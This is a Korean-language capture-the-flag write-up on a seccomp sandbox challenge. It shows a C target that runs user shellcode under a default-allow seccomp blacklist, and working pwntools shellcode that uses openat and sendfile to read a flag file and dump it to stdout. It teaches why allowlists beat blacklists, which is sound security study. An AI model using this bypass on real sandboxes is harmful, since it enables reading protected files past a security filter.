# Bypass_Seccomp (seccomp 우회)

셸코드를 실행할 수 있지만 **seccomp 블랙리스트**로 주요 syscall이 막혀 있다. 블랙리스트에 없는 **대체 syscall**로 flag를 읽어 유출한다.

## 대상 코드

```c
void sandbox() {
  ctx = seccomp_init(SCMP_ACT_ALLOW);            // 기본 허용
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0);
  seccomp_load(ctx);
}
int main() {
  void *shellcode = mmap(..., PROT_READ|PROT_WRITE|PROT_EXEC, ...);
  read(0, shellcode, 0x1000);   // 셸코드 입력
  sandbox();                    // 필터 적용
  ((void(*)())shellcode)();     // 셸코드 실행
}
```

- 정책: **기본 ALLOW + 블랙리스트**. 즉 명시적으로 죽이는 것만 피하면 된다.
- 금지: `open`, `execve`, `execveat`, `write`.
- 셸코드 실행 자체는 자유 → syscall 선택이 관건.

## 블랙리스트 방식의 약점

seccomp 블랙리스트는 “막지 않은 syscall은 전부 허용”한다. 같은 기능을 하는 다른 번호의 syscall이 존재하면 그대로 통과한다.

| 금지 | 대체 |
|---|---|
| `open` | `openat` (fd 기준 상대 열기) |
| `write` | `sendfile` (fd→fd 직접 전송), `writev` 등 |
| `execve` / `execveat` | 셸을 안 띄우고 **flag를 읽어 출력**하는 방향으로 우회 |

## 익스플로잇 원리

`open`/`write` 대신 `openat` + `sendfile`로 **flag 파일을 열어 stdout(fd 1)으로 그대로 흘려보낸다**.

```python
context.arch = 'x86_64'
shellcode  = shellcraft.openat(-100, './flag')   # AT_FDCWD(-100) 기준으로 flag open
shellcode += shellcraft.sendfile(1, 'rax', 0, 0x100)  # openat 결과 fd(rax) → stdout
shellcode += shellcraft.exit(0)
p.sendline(asm(shellcode))
```

- `openat(AT_FDCWD, "./flag", O_RDONLY)` → 반환 fd가 `rax`.
- `sendfile(out=1, in=rax, offset=0, count=0x100)` → 커널이 직접 파일→소켓/stdout 복사(`write` 불필요).
- 셸(`execve`) 없이 파일 내용만 유출하므로 `execve` 금지도 무관.

## 핵심 개념

- **블랙리스트 ≠ 안전**: 동일 기능의 우회 syscall이 남아 있으면 뚫린다. 반대로 화이트리스트(허용 목록)가 안전한 설계.
- `openat`/`sendfile`/`preadv` 등은 seccomp 우회에서 자주 쓰이는 대체 syscall.
- `seccomp-tools dump ./bypass_seccomp` 로 실제 필터 규칙을 확인할 수 있다.
